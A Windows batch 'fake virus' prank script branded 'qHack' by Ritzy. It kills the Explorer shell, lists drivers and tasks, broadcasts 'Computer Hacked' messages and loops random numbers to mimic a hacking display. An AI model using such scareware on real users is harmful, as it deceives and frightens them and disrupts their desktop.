::  ____           _____  _ _             
:: |  _ \         |  __ \(_) |            
:: | |_) |_   _   | |__) |_| |_ _____   _ 
:: |  _ <| | | |  |  _  /| | __|_  / | | |
:: | |_) | |_| |  | | \ \| | |_ / /| |_| |
:: |____/ \__, |  |_|  \_\_|\__/___|\__, |
::         __/ |                     __/ |
::        |___/                     |___/ 

@echo off
title qHack
color 0a

:: Advertising
@echo =================================================================
@echo                 Powered by Ritzy
@echo.
@echo                 Twitter @RitzyVex
@echo.
@echo           Copyright RitzyDevelopment 2021
@echo =================================================================

:: FakeVirus
@echo.
@echo Starting...
cd/
tree > tree
type tree
del tree
taskkill /f /IM explorer.exe
msconfig
taskkill /f /IM msconfig.exe
driverquery
driverquery
tasklist
tasklist
msg * Computer Hacked by Ritzy
msg * Complaints at ritzyvex684@pm.me
:loop
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto loop
